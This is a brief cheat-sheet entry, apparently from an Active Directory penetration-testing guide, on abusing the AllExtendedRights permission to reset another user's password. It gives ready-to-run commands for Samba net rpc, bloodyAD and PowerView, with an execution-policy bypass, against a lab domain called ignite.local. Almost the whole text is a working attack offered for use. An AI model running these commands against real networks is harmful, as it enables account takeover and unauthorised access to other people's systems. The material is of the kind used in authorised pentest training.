# AllExtendedRights

## Change Password

**Linux Net RPC - Samba:**

```bash
net rpc password kavish 'Password@987' -U ignite.local/geet%'Password@1' -S 192.168.1.8
```

**Linux Bloody AD:**

```bash
bloodyAD --host "192.168.1.8" -d "ignite.local" -u "geet" -p "Password@1" set password "kavish" "Password@987"
```

**Windows PowerShell - PowerView:**

```powershell
powershell -ep bypass
Import-Module .\PowerView.ps1
$NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
Set-DomainUserPassword -Identity 'kavish' -AccountPassword $NewPassword
```

[image]
